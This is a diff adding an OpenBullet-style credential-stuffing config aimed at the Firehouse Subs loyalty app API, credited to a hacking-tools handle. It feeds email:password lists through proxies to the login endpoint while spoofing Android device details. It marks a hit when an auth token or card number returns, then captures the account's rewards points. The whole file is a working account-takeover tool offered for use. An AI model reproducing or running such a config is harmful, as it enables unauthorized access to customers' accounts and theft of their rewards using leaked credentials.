@@ -1,0 +1,84 @@
+[SETTINGS]
+{
+  "Name": "Firehouse Subs(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-29T07:57:00.4838932+02:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "id" 
+
+REQUEST POST "https://alapp.relevantmobile.com/api/vncr/user/onlineorder/customer_connect" 
+  CONTENT "{\"android_id\":\"<id>\",\"appkey\":\"k4EkeZcjiiIYeMVB\",\"connect_type\":\"2\",\"device_id\":\"\",\"email\":\"<USER>\",\"os\":\"7.1.1\",\"password\":\"<PASS>\",\"phone_model\":\"unknown Google Pixel\",\"register_type\":\"1\",\"sign_in_device_type\":\"android\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: alapp.relevantmobile.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: okhttp/4.9.0" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The login or password you have entered is incorrect" 
+    KEY "Careful, too many failed login attempts can result in your account being locked" 
+  KEYCHAIN Success OR 
+    KEY "auth_token" 
+    KEY "card_number" 
+
+PARSE "<SOURCE>" JSON "auth_token" -> VAR "auth" 
+
+REQUEST GET "https://alapp.relevantmobile.com/api/vncr/bonusplan/DBreplicate_activity?appkey=k4EkeZcjiiIYeMVB&auth_token=<auth>" 
+  
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: alapp.relevantmobile.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: okhttp/4.9.0" 
+
+PARSE "<SOURCE>" JSON "points" CreateEmpty=FALSE -> CAP "Points" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
